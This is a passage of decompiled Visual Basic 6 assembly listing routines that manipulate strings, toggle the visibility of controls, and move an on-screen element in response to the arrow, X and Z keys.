0088199F: cmp var_00000094, 00000000h
008819A6: jnl 8819C8h
008819A8: push 0000005Ch
008819AA: push 00447A20h
008819AF: push var_00000090
008819B5: push var_00000094
008819BB: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008819C0: mov var_000000C0, eax
008819C6: jmp 8819CFh
008819C8: and var_000000C0, 00000000h
008819CF: lea ecx, var_24
008819D2: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
008819D7: mov eax, [ebp+08h]
008819DA: mov eax, [eax]
008819DC: push [ebp+08h]
008819DF: call [eax+00000340h]
008819E5: push eax
008819E6: lea eax, var_28
008819E9: push eax
008819EA: call 00410A84h ; Set (object)
008819EF: mov var_00000090, eax
008819F5: lea eax, var_1C
008819F8: push eax
008819F9: mov eax, var_00000090
008819FF: mov eax, [eax]
00881A01: push var_00000090
00881A07: call [eax+70h]
00881A0A: fclex 
00881A0C: mov var_00000094, eax
00881A12: cmp var_00000094, 00000000h
00881A19: jnl 881A3Bh
00881A1B: push 00000070h
00881A1D: push 00447A20h
00881A22: push var_00000090
00881A28: push var_00000094
00881A2E: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00881A33: mov var_000000C4, eax
00881A39: jmp 881A42h
00881A3B: and var_000000C4, 00000000h
00881A42: mov eax, [ebp+08h]
00881A45: mov eax, [eax]
00881A47: push [ebp+08h]
00881A4A: call [eax+0000031Ch]
00881A50: push eax
00881A51: lea eax, var_2C
00881A54: push eax
00881A55: call 00410A84h ; Set (object)
00881A5A: mov var_000000A0, eax
00881A60: mov eax, [ebp+08h]
00881A63: mov eax, [eax]
00881A65: push [ebp+08h]
00881A68: call [eax+0000031Ch]
00881A6E: push eax
00881A6F: lea eax, var_24
00881A72: push eax
00881A73: call 00410A84h ; Set (object)
00881A78: mov var_00000098, eax
00881A7E: lea eax, var_18
00881A81: push eax
00881A82: mov eax, var_00000098
00881A88: mov eax, [eax]
00881A8A: push var_00000098
00881A90: call [eax+50h]
00881A93: fclex 
00881A95: mov var_0000009C, eax
00881A9B: cmp var_0000009C, 00000000h
00881AA2: jnl 881AC4h
00881AA4: push 00000050h
00881AA6: push 004425E4h
00881AAB: push var_00000098
00881AB1: push var_0000009C
00881AB7: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00881ABC: mov var_000000C8, eax
00881AC2: jmp 881ACBh
00881AC4: and var_000000C8, 00000000h
00881ACB: mov eax, var_18
00881ACE: mov var_000000B0, eax
00881AD4: and var_18, 00000000h
00881AD8: mov eax, var_000000B0
00881ADE: mov var_64, eax
00881AE1: mov var_6C, 00000008h
00881AE8: mov var_44, 00000001h
00881AEF: mov var_4C, 00000002h
00881AF6: mov eax, var_1C
00881AF9: mov var_000000B4, eax
00881AFF: and var_1C, 00000000h
00881B03: mov eax, var_000000B4
00881B09: mov var_34, eax
00881B0C: mov var_3C, 00000008h
00881B13: lea eax, var_4C
00881B16: push eax
00881B17: push 00000001h
00881B19: lea eax, var_3C
00881B1C: push eax
00881B1D: lea eax, var_5C
00881B20: push eax
00881B21: call 00410772h ; arg_1 = Mid$(arg_2, arg_3, arg_4)
00881B26: lea eax, var_6C
00881B29: push eax
00881B2A: lea eax, var_5C
00881B2D: push eax
00881B2E: lea eax, var_7C
00881B31: push eax
00881B32: call 004109F4h ; msvbvm60.dll.__vbaVarCat
00881B37: push eax
00881B38: lea eax, var_20
00881B3B: push eax
00881B3C: call 0041097Ch ; msvbvm60.dll.__vbaStrVarVal
00881B41: push eax
00881B42: mov eax, var_000000A0
00881B48: mov eax, [eax]
00881B4A: push var_000000A0
00881B50: call [eax+54h]
00881B53: fclex 
00881B55: mov var_000000A4, eax
00881B5B: cmp var_000000A4, 00000000h
00881B62: jnl 881B84h
00881B64: push 00000054h
00881B66: push 004425E4h
00881B6B: push var_000000A0
00881B71: push var_000000A4
00881B77: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00881B7C: mov var_000000CC, eax
00881B82: jmp 881B8Bh
00881B84: and var_000000CC, 00000000h
00881B8B: lea ecx, var_20
00881B8E: call 00410A66h ; msvbvm60.dll.__vbaFreeStr
00881B93: lea eax, var_2C
00881B96: push eax
00881B97: lea eax, var_28
00881B9A: push eax
00881B9B: lea eax, var_24
00881B9E: push eax
00881B9F: push 00000003h
00881BA1: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
00881BA6: add esp, 00000010h
00881BA9: lea eax, var_7C
00881BAC: push eax
00881BAD: lea eax, var_5C
00881BB0: push eax
00881BB1: lea eax, var_6C
00881BB4: push eax
00881BB5: lea eax, var_4C
00881BB8: push eax
00881BB9: lea eax, var_3C
00881BBC: push eax
00881BBD: push 00000005h
00881BBF: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
00881BC4: add esp, 00000018h
00881BC7: mov eax, [ebp+08h]
00881BCA: mov eax, [eax]
00881BCC: push [ebp+08h]
00881BCF: call [eax+00000340h]
00881BD5: push eax
00881BD6: lea eax, var_24
00881BD9: push eax
00881BDA: call 00410A84h ; Set (object)
00881BDF: mov var_00000090, eax
00881BE5: lea eax, var_18
00881BE8: push eax
00881BE9: mov eax, var_00000090
00881BEF: mov eax, [eax]
00881BF1: push var_00000090
00881BF7: call [eax+70h]
00881BFA: fclex 
00881BFC: mov var_00000094, eax
00881C02: cmp var_00000094, 00000000h
00881C09: jnl 881C2Bh
00881C0B: push 00000070h
00881C0D: push 00447A20h
00881C12: push var_00000090
00881C18: push var_00000094
00881C1E: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00881C23: mov var_000000D0, eax
00881C29: jmp 881C32h
00881C2B: and var_000000D0, 00000000h
00881C32: mov eax, [ebp+08h]
00881C35: mov eax, [eax]
00881C37: push [ebp+08h]
00881C3A: call [eax+00000340h]
00881C40: push eax
00881C41: lea eax, var_2C
00881C44: push eax
00881C45: call 00410A84h ; Set (object)
00881C4A: mov var_000000A0, eax
00881C50: mov eax, [ebp+08h]
00881C53: mov eax, [eax]
00881C55: push [ebp+08h]
00881C58: call [eax+00000340h]
00881C5E: push eax
00881C5F: lea eax, var_28
00881C62: push eax
00881C63: call 00410A84h ; Set (object)
00881C68: mov var_00000098, eax
00881C6E: lea eax, var_1C
00881C71: push eax
00881C72: mov eax, var_00000098
00881C78: mov eax, [eax]
00881C7A: push var_00000098
00881C80: call [eax+70h]
00881C83: fclex 
00881C85: mov var_0000009C, eax
00881C8B: cmp var_0000009C, 00000000h
00881C92: jnl 881CB4h
00881C94: push 00000070h
00881C96: push 00447A20h
00881C9B: push var_00000098
00881CA1: push var_0000009C
00881CA7: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00881CAC: mov var_000000D4, eax
00881CB2: jmp 881CBBh
00881CB4: and var_000000D4, 00000000h
00881CBB: push var_1C
00881CBE: call 0041098Eh ; Len(arg_1)
00881CC3: mov var_44, eax
00881CC6: mov var_4C, 00000003h
00881CCD: mov eax, var_18
00881CD0: mov var_000000B8, eax
00881CD6: and var_18, 00000000h
00881CDA: mov eax, var_000000B8
00881CE0: mov var_34, eax
00881CE3: mov var_3C, 00000008h
00881CEA: lea eax, var_4C
00881CED: push eax
00881CEE: push 00000002h
00881CF0: lea eax, var_3C
00881CF3: push eax
00881CF4: lea eax, var_5C
00881CF7: push eax
00881CF8: call 00410772h ; arg_1 = Mid$(arg_2, arg_3, arg_4)
00881CFD: lea eax, var_5C
00881D00: push eax
00881D01: lea eax, var_20
00881D04: push eax
00881D05: call 0041097Ch ; msvbvm60.dll.__vbaStrVarVal
00881D0A: push eax
00881D0B: mov eax, var_000000A0
00881D11: mov eax, [eax]
00881D13: push var_000000A0
00881D19: call [eax+74h]
00881D1C: fclex 
00881D1E: mov var_000000A4, eax
00881D24: cmp var_000000A4, 00000000h
00881D2B: jnl 881D4Dh
00881D2D: push 00000074h
00881D2F: push 00447A20h
00881D34: push var_000000A0
00881D3A: push var_000000A4
00881D40: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00881D45: mov var_000000D8, eax
00881D4B: jmp 881D54h
00881D4D: and var_000000D8, 00000000h
00881D54: lea eax, var_20
00881D57: push eax
00881D58: lea eax, var_1C
00881D5B: push eax
00881D5C: push 00000002h
00881D5E: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
00881D63: add esp, 0000000Ch
00881D66: lea eax, var_2C
00881D69: push eax
00881D6A: lea eax, var_28
00881D6D: push eax
00881D6E: lea eax, var_24
00881D71: push eax
00881D72: push 00000003h
00881D74: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
00881D79: add esp, 00000010h
00881D7C: lea eax, var_5C
00881D7F: push eax
00881D80: lea eax, var_4C
00881D83: push eax
00881D84: lea eax, var_3C
00881D87: push eax
00881D88: push 00000003h
00881D8A: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
00881D8F: add esp, 00000010h
00881D92: mov var_04, 00000000h
00881D99: push 00881DECh
00881D9E: jmp 881DEBh
00881DA0: lea eax, var_20
00881DA3: push eax
00881DA4: lea eax, var_1C
00881DA7: push eax
00881DA8: lea eax, var_18
00881DAB: push eax
00881DAC: push 00000003h
00881DAE: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
00881DB3: add esp, 00000010h
00881DB6: lea eax, var_2C
00881DB9: push eax
00881DBA: lea eax, var_28
00881DBD: push eax
00881DBE: lea eax, var_24
00881DC1: push eax
00881DC2: push 00000003h
00881DC4: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
00881DC9: add esp, 00000010h
00881DCC: lea eax, var_7C
00881DCF: push eax
00881DD0: lea eax, var_6C
00881DD3: push eax
00881DD4: lea eax, var_5C
00881DD7: push eax
00881DD8: lea eax, var_4C
00881DDB: push eax
00881DDC: lea eax, var_3C
00881DDF: push eax
00881DE0: push 00000005h
00881DE2: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
00881DE7: add esp, 00000018h
00881DEA: ret 
End Sub

Private sub pic__87BD79
0087BD79: push ebp
0087BD7A: mov ebp, esp
0087BD7C: sub esp, 00000014h
0087BD7F: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
0087BD84: mov eax, fs:[00h]
0087BD8A: push eax
0087BD8B: mov fs:[00000000h], esp
0087BD92: mov eax, 00000088h
0087BD97: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0087BD9C: push ebx
0087BD9D: push esi
0087BD9E: push edi
0087BD9F: mov var_14, esp
0087BDA2: mov var_10, 0040D7E8h
0087BDA9: mov eax, [ebp+08h]
0087BDAC: and eax, 00000001h
0087BDAF: mov var_0C, eax
0087BDB2: mov eax, [ebp+08h]
0087BDB5: and al, FEh
0087BDB7: mov [ebp+08h], eax
0087BDBA: mov var_08, 00000000h
0087BDC1: mov eax, [ebp+08h]
0087BDC4: mov eax, [eax]
0087BDC6: push [ebp+08h]
0087BDC9: call [eax+04h]
0087BDCC: push 00000001h
0087BDCE: call 00410A60h ; On Error ...
0087BDD3: mov eax, [ebp+08h]
0087BDD6: cmp [eax+000000A0h], 00000000h
0087BDDD: jnz 87BE02h
0087BDDF: mov eax, [ebp+08h]
0087BDE2: add eax, 000000A0h
0087BDE7: push eax
0087BDE8: push 00440E38h
0087BDED: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
0087BDF2: mov eax, [ebp+08h]
0087BDF5: add eax, 000000A0h
0087BDFA: mov var_0000008C, eax
0087BE00: jmp 87BE10h
0087BE02: mov eax, [ebp+08h]
0087BE05: add eax, 000000A0h
0087BE0A: mov var_0000008C, eax
0087BE10: mov eax, var_0000008C
0087BE16: mov eax, [eax]
0087BE18: mov var_6C, eax
0087BE1B: lea eax, var_68
0087BE1E: push eax
0087BE1F: mov eax, var_6C
0087BE22: mov eax, [eax]
0087BE24: push var_6C
0087BE27: call [eax+24h]
0087BE2A: fclex 
0087BE2C: mov var_70, eax
0087BE2F: cmp var_70, 00000000h
0087BE33: jnl 87BE4Fh
0087BE35: push 00000024h
0087BE37: push 00440E28h
0087BE3C: push var_6C
0087BE3F: push var_70
0087BE42: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087BE47: mov var_00000090, eax
0087BE4D: jmp 87BE56h
0087BE4F: and var_00000090, 00000000h
0087BE56: cmp var_68, 00000000h
0087BE5A: jle 0087C068h
0087BE60: mov eax, [ebp+08h]
0087BE63: mov eax, [eax]
0087BE65: push [ebp+08h]
0087BE68: call [eax+00000344h]
0087BE6E: push eax
0087BE6F: lea eax, var_24
0087BE72: push eax
0087BE73: call 00410A84h ; Set (object)
0087BE78: mov var_6C, eax
0087BE7B: push 00000000h
0087BE7D: mov eax, var_6C
0087BE80: mov eax, [eax]
0087BE82: push var_6C
0087BE85: call [eax+5Ch]
0087BE88: fclex 
0087BE8A: mov var_70, eax
0087BE8D: cmp var_70, 00000000h
0087BE91: jnl 87BEADh
0087BE93: push 0000005Ch
0087BE95: push 00447A20h
0087BE9A: push var_6C
0087BE9D: push var_70
0087BEA0: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087BEA5: mov var_00000094, eax
0087BEAB: jmp 87BEB4h
0087BEAD: and var_00000094, 00000000h
0087BEB4: lea ecx, var_24
0087BEB7: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
0087BEBC: mov eax, [ebp+08h]
0087BEBF: cmp [eax+000000A0h], 00000000h
0087BEC6: jnz 87BEEBh
0087BEC8: mov eax, [ebp+08h]
0087BECB: add eax, 000000A0h
0087BED0: push eax
0087BED1: push 00440E38h
0087BED6: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
0087BEDB: mov eax, [ebp+08h]
0087BEDE: add eax, 000000A0h
0087BEE3: mov var_00000098, eax
0087BEE9: jmp 87BEF9h
0087BEEB: mov eax, [ebp+08h]
0087BEEE: add eax, 000000A0h
0087BEF3: mov var_00000098, eax
0087BEF9: mov eax, var_00000098
0087BEFF: mov eax, [eax]
0087BF01: mov var_6C, eax
0087BF04: lea eax, var_68
0087BF07: push eax
0087BF08: mov eax, var_6C
0087BF0B: mov eax, [eax]
0087BF0D: push var_6C
0087BF10: call [eax+24h]
0087BF13: fclex 
0087BF15: mov var_70, eax
0087BF18: cmp var_70, 00000000h
0087BF1C: jnl 87BF38h
0087BF1E: push 00000024h
0087BF20: push 00440E28h
0087BF25: push var_6C
0087BF28: push var_70
0087BF2B: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087BF30: mov var_0000009C, eax
0087BF36: jmp 87BF3Fh
0087BF38: and var_0000009C, 00000000h
0087BF3F: mov eax, var_68
0087BF42: mov var_78, eax
0087BF45: mov var_74, 00000001h
0087BF4C: mov var_20, 00000001h
0087BF53: jmp 87BF64h
0087BF55: mov eax, var_20
0087BF58: add eax, var_74
0087BF5B: jo 0087C0A5h
0087BF61: mov var_20, eax
0087BF64: mov eax, var_20
0087BF67: cmp eax, var_78
0087BF6A: jnle 0087C03Bh
0087BF70: or var_4C, FFFFFFFFh
0087BF74: mov var_54, 0000000Bh
0087BF7B: mov eax, [ebp+08h]
0087BF7E: cmp [eax+000000A0h], 00000000h
0087BF85: jnz 87BFAAh
0087BF87: mov eax, [ebp+08h]
0087BF8A: add eax, 000000A0h
0087BF8F: push eax
0087BF90: push 00440E38h
0087BF95: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
0087BF9A: mov eax, [ebp+08h]
0087BF9D: add eax, 000000A0h
0087BFA2: mov var_000000A0, eax
0087BFA8: jmp 87BFB8h
0087BFAA: mov eax, [ebp+08h]
0087BFAD: add eax, 000000A0h
0087BFB2: mov var_000000A0, eax
0087BFB8: mov eax, var_000000A0
0087BFBE: mov eax, [eax]
0087BFC0: mov var_6C, eax
0087BFC3: lea eax, var_20
0087BFC6: mov var_3C, eax
0087BFC9: mov var_44, 00004003h
0087BFD0: lea eax, var_34
0087BFD3: push eax
0087BFD4: lea eax, var_44
0087BFD7: push eax
0087BFD8: mov eax, var_6C
0087BFDB: mov eax, [eax]
0087BFDD: push var_6C
0087BFE0: call [eax+1Ch]
0087BFE3: fclex 
0087BFE5: mov var_70, eax
0087BFE8: cmp var_70, 00000000h
0087BFEC: jnl 87C008h
0087BFEE: push 0000001Ch
0087BFF0: push 00440E28h
0087BFF5: push var_6C
0087BFF8: push var_70
0087BFFB: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087C000: mov var_000000A4, eax
0087C006: jmp 87C00Fh
0087C008: and var_000000A4, 00000000h
0087C00F: push 00000010h
0087C011: pop eax
0087C012: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0087C017: lea esi, var_54
0087C01A: mov edi, esp
0087C01C: movsd 
0087C01D: movsd 
0087C01E: movsd 
0087C01F: movsd 
0087C020: push 00457C44h ; Visible
0087C025: lea eax, var_34
0087C028: push eax
0087C029: call 0041087Ah ; msvbvm60.dll.__vbaVarLateMemSt
0087C02E: lea ecx, var_34
0087C031: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
0087C036: jmp 0087BF55h
0087C03B: push 00440E28h
0087C040: push 00000000h
0087C042: call 00410A06h ; msvbvm60.dll.__vbaCastObj
0087C047: push eax
0087C048: lea eax, var_24
0087C04B: push eax
0087C04C: call 00410A84h ; Set (object)
0087C051: push eax
0087C052: mov eax, [ebp+08h]
0087C055: add eax, 000000A0h
0087C05A: push eax
0087C05B: call 004108E0h ; msvbvm60.dll.__vbaObjSetAddref
0087C060: lea ecx, var_24
0087C063: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
0087C068: call 004109C4h ; msvbvm60.dll.__vbaExitProc
0087C06D: push 0087C086h
0087C072: jmp 87C085h
0087C074: lea ecx, var_24
0087C077: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
0087C07C: lea ecx, var_34
0087C07F: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
0087C084: ret 
End Sub

Private sub pic__87C0AA
0087C0AA: push ebp
0087C0AB: mov ebp, esp
0087C0AD: sub esp, 00000014h
0087C0B0: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
0087C0B5: mov eax, fs:[00h]
0087C0BB: push eax
0087C0BC: mov fs:[00000000h], esp
0087C0C3: mov eax, 00000090h
0087C0C8: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0087C0CD: push ebx
0087C0CE: push esi
0087C0CF: push edi
0087C0D0: mov var_14, esp
0087C0D3: mov var_10, 0040D810h
0087C0DA: mov eax, [ebp+08h]
0087C0DD: and eax, 00000001h
0087C0E0: mov var_0C, eax
0087C0E3: mov eax, [ebp+08h]
0087C0E6: and al, FEh
0087C0E8: mov [ebp+08h], eax
0087C0EB: mov var_08, 00000000h
0087C0F2: mov eax, [ebp+08h]
0087C0F5: mov eax, [eax]
0087C0F7: push [ebp+08h]
0087C0FA: call [eax+04h]
0087C0FD: push 00000001h
0087C0FF: call 00410A60h ; On Error ...
0087C104: mov eax, [ebp+0Ch]
0087C107: mov ax, [eax]
0087C10A: mov var_44, ax
0087C10E: movsx eax, word ptr var_44
0087C112: mov var_58, eax
0087C115: cmp var_58, 00000025h
0087C119: jz 87C152h
0087C11B: cmp var_58, 00000026h
0087C11F: jz 0087C2A6h
0087C125: cmp var_58, 00000027h
0087C129: jz 0087C45Bh
0087C12F: cmp var_58, 00000028h
0087C133: jz 0087C616h
0087C139: cmp var_58, 00000058h
0087C13D: jz 0087C8BDh
0087C143: cmp var_58, 0000005Ah
0087C147: jz 0087C77Ch
0087C14D: jmp 0087C9F9h
0087C152: mov eax, [ebp+08h]
0087C155: mov eax, [eax]
0087C157: push [ebp+08h]
0087C15A: call [eax+0000032Ch]
0087C160: push eax
0087C161: lea eax, var_20
0087C164: push eax
0087C165: call 00410A84h ; Set (object)
0087C16A: mov var_30, eax
0087C16D: lea eax, var_28
0087C170: push eax
0087C171: mov eax, var_30
0087C174: mov eax, [eax]
0087C176: push var_30
0087C179: call [eax+000000B8h]
0087C17F: fclex 
0087C181: mov var_34, eax
0087C184: cmp var_34, 00000000h
0087C188: jnl 87C1A4h
0087C18A: push 000000B8h
0087C18F: push 00457C24h
0087C194: push var_30
0087C197: push var_34
0087C19A: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087C19F: mov var_5C, eax
0087C1A2: jmp 87C1A8h
0087C1A4: and var_5C, 00000000h
0087C1A8: mov ax, var_28
0087C1AC: sub ax, 001Eh
0087C1B0: jo 0087CA73h
0087C1B6: xor ecx, ecx
0087C1B8: test ax, ax
0087C1BB: setnle cl
0087C1BE: neg ecx
0087C1C0: mov var_38, cx
0087C1C4: lea ecx, var_20
0087C1C7: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
0087C1CC: movsx eax, word ptr var_38
0087C1D0: test eax, eax
0087C1D2: jz 0087C2A1h
0087C1D8: mov eax, [ebp+08h]
0087C1DB: mov eax, [eax]
0087C1DD: push [ebp+08h]
0087C1E0: call [eax+0000032Ch]
0087C1E6: push eax
0087C1E7: lea eax, var_24
0087C1EA: push eax
0087C1EB: call 00410A84h ; Set (object)
0087C1F0: mov var_38, eax
0087C1F3: mov eax, [ebp+08h]
0087C1F6: mov eax, [eax]
0087C1F8: push [ebp+08h]
0087C1FB: call [eax+0000032Ch]
0087C201: push eax
0087C202: lea eax, var_20
0087C205: push eax
0087C206: call 00410A84h ; Set (object)
0087C20B: mov var_30, eax
0087C20E: lea eax, var_28
0087C211: push eax
0087C212: mov eax, var_30
0087C215: mov eax, [eax]
0087C217: push var_30
0087C21A: call [eax+000000B8h]
0087C220: fclex 
0087C222: mov var_34, eax
0087C225: cmp var_34, 00000000h
0087C229: jnl 87C245h
0087C22B: push 000000B8h
0087C230: push 00457C24h
0087C235: push var_30
0087C238: push var_34
0087C23B: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087C240: mov var_60, eax
0087C243: jmp 87C249h
0087C245: and var_60, 00000000h
0087C249: mov ax, var_28
0087C24D: sub ax, 001Eh
0087C251: jo 0087CA73h
0087C257: push eax
0087C258: mov eax, var_38
0087C25B: mov eax, [eax]
0087C25D: push var_38
0087C260: call [eax+000000BCh]
0087C266: fclex 
0087C268: mov var_3C, eax
0087C26B: cmp var_3C, 00000000h
0087C26F: jnl 87C28Bh
0087C271: push 000000BCh
0087C276: push 00457C24h
0087C27B: push var_38
0087C27E: push var_3C
0087C281: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087C286: mov var_64, eax
0087C289: jmp 87C28Fh
0087C28B: and var_64, 00000000h
0087C28F: lea eax, var_24
0087C292: push eax
0087C293: lea eax, var_20
0087C296: push eax
0087C297: push 00000002h
0087C299: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0087C29E: add esp, 0000000Ch
0087C2A1: jmp 0087C9F9h
0087C2A6: mov eax, [ebp+08h]
0087C2A9: mov eax, [eax]
0087C2AB: push [ebp+08h]
0087C2AE: call [eax+00000330h]
0087C2B4: push eax
0087C2B5: lea eax, var_20
0087C2B8: push eax
0087C2B9: call 00410A84h ; Set (object)
0087C2BE: mov var_30, eax
0087C2C1: lea eax, var_28
0087C2C4: push eax
0087C2C5: mov eax, var_30
0087C2C8: mov eax, [eax]
0087C2CA: push var_30
0087C2CD: call [eax+000000B8h]
0087C2D3: fclex 
0087C2D5: mov var_34, eax
0087C2D8: cmp var_34, 00000000h
0087C2DC: jnl 87C2F8h
0087C2DE: push 000000B8h
0087C2E3: push 00457C34h
0087C2E8: push var_30
0087C2EB: push var_34
0087C2EE: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087C2F3: mov var_68, eax
0087C2F6: jmp 87C2FCh
0087C2F8: and var_68, 00000000h
0087C2FC: mov eax, [ebp+08h]
0087C2FF: mov eax, [eax]
0087C301: push [ebp+08h]
0087C304: call [eax+00000330h]
0087C30A: push eax
0087C30B: lea eax, var_24
0087C30E: push eax
0087C30F: call 00410A84h ; Set (object)
0087C314: mov var_38, eax
0087C317: lea eax, var_2C
0087C31A: push eax
0087C31B: mov eax, var_38
0087C31E: mov eax, [eax]
0087C320: push var_38
0087C323: call [eax+000000A0h]
0087C329: fclex 
0087C32B: mov var_3C, eax
0087C32E: cmp var_3C, 00000000h
0087C332: jnl 87C34Eh
0087C334: push 000000A0h
0087C339: push 00457C34h
0087C33E: push var_38
0087C341: push var_3C
0087C344: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087C349: mov var_6C, eax
0087C34C: jmp 87C352h
0087C34E: and var_6C, 00000000h
0087C352: mov ax, var_28
0087C356: sub ax, 001Eh
0087C35A: jo 0087CA73h
0087C360: xor ecx, ecx
0087C362: cmp ax, var_2C
0087C366: setl cl
0087C369: neg ecx
0087C36B: mov var_40, cx
0087C36F: lea eax, var_24
0087C372: push eax
0087C373: lea eax, var_20
0087C376: push eax
0087C377: push 00000002h
0087C379: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0087C37E: add esp, 0000000Ch
0087C381: movsx eax, word ptr var_40
0087C385: test eax, eax
0087C387: jz 0087C456h
0087C38D: mov eax, [ebp+08h]
0087C390: mov eax, [eax]
0087C392: push [ebp+08h]
0087C395: call [eax+00000330h]
0087C39B: push eax
0087C39C: lea eax, var_24
0087C39F: push eax
0087C3A0: call 00410A84h ; Set (object)
0087C3A5: mov var_38, eax
0087C3A8: mov eax, [ebp+08h]
0087C3AB: mov eax, [eax]
0087C3AD: push [ebp+08h]
0087C3B0: call [eax+00000330h]
0087C3B6: push eax
0087C3B7: lea eax, var_20
0087C3BA: push eax
0087C3BB: call 00410A84h ; Set (object)
0087C3C0: mov var_30, eax
0087C3C3: lea eax, var_28
0087C3C6: push eax
0087C3C7: mov eax, var_30
0087C3CA: mov eax, [eax]
0087C3CC: push var_30
0087C3CF: call [eax+000000B8h]
0087C3D5: fclex 
0087C3D7: mov var_34, eax
0087C3DA: cmp var_34, 00000000h
0087C3DE: jnl 87C3FAh
0087C3E0: push 000000B8h
0087C3E5: push 00457C34h
0087C3EA: push var_30
0087C3ED: push var_34
0087C3F0: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087C3F5: mov var_70, eax
0087C3F8: jmp 87C3FEh
0087C3FA: and var_70, 00000000h
0087C3FE: mov ax, var_28
0087C402: sub ax, 001Eh
0087C406: jo 0087CA73h
0087C40C: push eax
0087C40D: mov eax, var_38
0087C410: mov eax, [eax]
0087C412: push var_38
0087C415: call [eax+000000BCh]
0087C41B: fclex 
0087C41D: mov var_3C, eax
0087C420: cmp var_3C, 00000000h
0087C424: jnl 87C440h
0087C426: push 000000BCh
0087C42B: push 00457C34h
0087C430: push var_38
0087C433: push var_3C
0087C436: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087C43B: mov var_74, eax
0087C43E: jmp 87C444h
0087C440: and var_74, 00000000h
0087C444: lea eax, var_24
0087C447: push eax
0087C448: lea eax, var_20
0087C44B: push eax
0087C44C: push 00000002h
0087C44E: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0087C453: add esp, 0000000Ch
0087C456: jmp 0087C9F9h
0087C45B: mov eax, [ebp+08h]
0087C45E: mov eax, [eax]
0087C460: push [ebp+08h]
0087C463: call [eax+0000032Ch]
0087C469: push eax
0087C46A: lea eax, var_20
0087C46D: push eax
0087C46E: call 00410A84h ; Set (object)
0087C473: mov var_30, eax
0087C476: lea eax, var_28
0087C479: push eax
0087C47A: mov eax, var_30
0087C47D: mov eax, [eax]
0087C47F: push var_30
0087C482: call [eax+000000B8h]
0087C488: fclex 
0087C48A: mov var_34, eax
0087C48D: cmp var_34, 00000000h
0087C491: jnl 87C4ADh
0087C493: push 000000B8h
0087C498: push 00457C24h
0087C49D: push var_30
0087C4A0: push var_34
0087C4A3: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087C4A8: mov var_78, eax
0087C4AB: jmp 87C4B1h
0087C4AD: and var_78, 00000000h
0087C4B1: mov eax, [ebp+08h]
0087C4B4: mov eax, [eax]
0087C4B6: push [ebp+08h]
0087C4B9: call [eax+0000032Ch]
0087C4BF: push eax
0087C4C0: lea eax, var_24
0087C4C3: push eax
0087C4C4: call 00410A84h ; Set (object)
0087C4C9: mov var_38, eax
0087C4CC: lea eax, var_2C
0087C4CF: push eax
0087C4D0: mov eax, var_38
0087C4D3: mov eax, [eax]
0087C4D5: push var_38
0087C4D8: call [eax+000000A0h]
0087C4DE: fclex 
0087C4E0: mov var_3C, eax
0087C4E3: cmp var_3C, 00000000h
0087C4E7: jnl 87C503h
0087C4E9: push 000000A0h
0087C4EE: push 00457C24h
0087C4F3: push var_38
0087C4F6: push var_3C
0087C4F9: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087C4FE: mov var_7C, eax
0087C501: jmp 87C507h
0087C503: and var_7C, 00000000h
0087C507: mov ax, var_28
0087C50B: add ax, 001Eh
0087C50F: jo 0087CA73h
0087C515: xor ecx, ecx
0087C517: cmp ax, var_2C
0087C51B: setl cl
0087C51E: neg ecx
0087C520: mov var_40, cx
0087C524: lea eax, var_24
0087C527: push eax
0087C528: lea eax, var_20
0087C52B: push eax
0087C52C: push 00000002h
0087C52E: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0087C533: add esp, 0000000Ch
0087C536: movsx eax, word ptr var_40
0087C53A: test eax, eax
0087C53C: jz 0087C611h
0087C542: mov eax, [ebp+08h]
0087C545: mov eax, [eax]
0087C547: push [ebp+08h]
0087C54A: call [eax+0000032Ch]
0087C550: push eax
0087C551: lea eax, var_24
0087C554: push eax
0087C555: call 00410A84h ; Set (object)
0087C55A: mov var_38, eax
0087C55D: mov eax, [ebp+08h]
0087C560: mov eax, [eax]
0087C562: push [ebp+08h]
0087C565: call [eax+0000032Ch]
